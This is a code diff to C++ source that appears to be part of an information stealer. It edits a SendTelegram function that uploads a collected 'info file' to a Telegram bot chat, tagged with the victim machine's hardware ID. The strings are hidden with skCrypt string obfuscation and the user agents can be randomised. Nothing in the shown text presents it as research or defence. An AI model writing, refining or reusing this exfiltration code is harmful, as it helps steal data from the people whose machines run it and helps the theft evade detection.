@@ -22,17 +22,28 @@ void SendEmail() {
 }
 
 void SendTelegram() {
+    string crlf = (string)skCrypt("\r\n");
+    string sep = (string)skCrypt("--");
     string boundary = (string)skCrypt("$$") + GenerateRandom(32) + (string)skCrypt("$$");
     string header = (string)skCrypt("Content-Type: multipart/form-data; boundary=") + boundary;
-    string beggining = (string)skCrypt("--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n") + CHAT_ID +
-        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n") + GetHWID() +
-        (string)skCrypt("\r\n--") + boundary + (string)skCrypt("\r\nContent-Disposition: form-data; name=\"document\"; filename=\"") + Split(INFOFILE, '\\').back() + (string)skCrypt("\"\r\nContent-Type: text/plain\r\n\r\n");
-    string ending = (string)skCrypt("\r\n--") + boundary + (string)skCrypt("--\r\n");
-    string userAgent = userAgents[0];
-    if (RANDOM_USERAGENT)
-        userAgent = GetRandomUserAgent();
+    string beggining = sep + boundary + crlf +
+        (string)skCrypt("Content-Disposition: form-data; name=\"chat_id\"") + crlf + crlf +
+        CHAT_ID + crlf +
+        sep + boundary + crlf +
+        (string)skCrypt("Content-Disposition: form-data; name=\"caption\"") + crlf + crlf +
+        GetHWID() + crlf +
+        sep + boundary + crlf +
+        (string)skCrypt("Content-Disposition: form-data; name=\"document\"; filename=\"") + Split(INFOFILE, '\\').back() + (string)skCrypt("\"") + crlf +
+        (string)skCrypt("Content-Type: text/plain") + crlf + crlf;
+    string ending = crlf + sep + boundary + sep + crlf;
 
-    ifstream rFile(INFOFILE, ios::in);
+#if RANDOM_USERAGENT
+    string userAgent = GetRandomUserAgent();
+#else
+    string userAgent = userAgents[0];
+#endif
+
+    ifstream rFile(INFOFILE);
     stringstream buffer;
     buffer << rFile.rdbuf();
     rFile.close();
@@ -52,7 +63,7 @@ void SendTelegram() {
     if (!hrequest)
         goto cleanup;
 
-    if (!HttpSendRequestA(hrequest, header.c_str(), (DWORD)-1, (LPVOID)data.c_str(), data.size()))
+    if (!HttpSendRequestA(hrequest, header.c_str(), (DWORD)-1, (LPVOID)data.c_str(), data.length()))
         goto cleanup;
 
     DWORD received;
@@ -64,8 +75,8 @@ void SendTelegram() {
         str[sizeof(buf)] = 0;
         filesLink.push_back(str);
         Json data = Json::parse(str);
-        if (!data[(string)skCrypt("ok")] && DEBUG)
-            cout << skCrypt("Info file not sent via telegram bot") << endl;
+        if (!data[(string)skCrypt("ok")])
+            cout << (string)skCrypt("Info file not sent via telegram bot") << endl;
     }
 
 
